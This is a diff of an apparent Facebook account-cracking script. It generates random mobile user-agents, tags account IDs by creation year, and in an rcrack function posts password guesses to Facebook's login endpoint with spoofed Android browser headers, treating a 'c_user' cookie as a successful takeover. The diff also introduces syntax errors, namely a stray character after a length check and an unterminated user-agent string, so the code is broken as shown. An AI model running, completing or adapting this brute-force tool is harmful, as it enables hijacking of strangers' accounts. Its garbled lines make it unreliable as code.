@@ -185,13 +185,14 @@ for xd in range(10000):
     i='0'
     j=random.randrange(4200,4900)
     k=random.randrange(40,150)
+    
     l='Mobile Safari/537.36'
     uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
     ugen.append(uaku2)
     
 
 def samiya(uid):
-    if len(uid)==15:
+    if len(uid)==15:l
         if uid[:10] in ['1000000000']       :shanto = ' (*-*) 2009'
         elif uid[:9] in ['100000000']       :shanto = '√ 2009'
         elif uid[:8] in ['10000000']        :shanto = '√ 2009'
@@ -294,33 +295,23 @@ def rcrack(uid,pwx,tl):
             header_freefb = {'authority': 'mbasic.facebook.com',
             'method':'GET',
             'scheme':'https',
-            'access-control-allow-origin': '*',
-            'facebook-api-version': 'v17.0',
-            'strict-transport-security': 'max-age=15552000; preload',
-            'pragma': 'no-cache',
-            'cache-control': 'private, no-cache, no-store, must-revalidate',
-            'x-fb-request-id': 'AFIDbHyt64aMLKXqlTrceYY',
-            'x-fb-trace-id': 'F9k/IXe6GPv',
-            'x-fb-rev': '1008157668',
-            'x-fb-debug': 'c931stKO1P8xAG5PRAjeJa7+zd11brUUxs/AXdx7muT1243P0/4pf4Y2KBU+opCEAh5nMFzYLRRuuG6Tte3mcQ==',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-US,en;q=0.9',
-            'cache-control': 'max-age=0',
-            'dpr': '1',
-            'sec-ch-prefers-color-scheme': 'light',
-            'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
-            'sec-ch-ua-full-version-list': '"Chromium";v="116.0.5845.180", "Not)A;Brand";v="24.0.0.0", "Google Chrome";v="116.0.5845.180"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-model': '""',
-            'sec-ch-ua-platform': '"Windows"',
+            'accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7',
+            'dpr': '2',
+            'sec-ch-prefers-color-scheme': 'dark',
+            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-model': '"TECNO KE7"',
+            'sec-ch-ua-platform': '"Android"',
             'sec-ch-ua-platform-version': '"10.0.0"',
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
             'sec-fetch-site': 'none',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': pro,
-            'viewport-width': '1125',}
+            'user-agent': 'pro,
+            'viewport-width': '980',}
             lo = session.post('https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
